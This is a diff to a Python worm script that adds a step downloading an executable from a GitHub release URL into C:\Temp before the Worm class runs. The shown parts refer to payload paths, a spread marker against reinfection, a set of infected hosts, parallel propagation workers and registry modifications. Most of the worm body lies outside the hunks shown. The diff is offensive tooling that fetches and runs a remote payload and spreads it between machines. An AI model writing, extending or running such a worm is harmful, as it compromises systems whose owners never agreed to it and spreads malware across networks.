@@ -10,15 +10,20 @@ import re
 import time
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
+from download_file import download_file
 
-# Configuration
-PAYLOAD_PATH = r"C:\Users\Admin\Desktop\facebook.ps1"  # Path to your malware
-PAYLOAD_NAME = "update.exe"
-SPREAD_MARKER = r"C:\Windows\Temp\.worm_spread"  # Flag to prevent re-spreading on same machine
+# --- CONFIGURATION PARAMETERS ---
+DOWNLOAD_URL = "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/download/v1.0.17/main.exe"
+PAYLOAD_PATH = r"C:\Temp"
+PAYLOAD_NAME = "monoukfile.exe"
+SPREAD_MARKER = r"C:\Windows\Temp\.worm_spread" 
+
+# Correctly joins them to: C:\Temp\monoukfile.exe
+TARGET_PATH = os.path.join(PAYLOAD_PATH, PAYLOAD_NAME)
 
 class Worm:
     def __init__(self):
-        self.payload_path = PAYLOAD_PATH
+        self.payload_path = TARGET_PATH
         self.infected_hosts = set()
         self.max_workers = 10
     
@@ -193,5 +198,10 @@ class Worm:
         self.log(f"Worm propagation complete. Infected: {infected}", "+")
 
 if __name__ == "__main__":
-    worm = Worm()
-    worm.run()
+    if download_file(DOWNLOAD_URL, TARGET_PATH):
+        # 3. If download completes successfully, proceed with registry modifications
+        worm = Worm()
+        worm.run()
+    else:
+        print("[-] Deployment terminated due to download failure constraints.")
+    
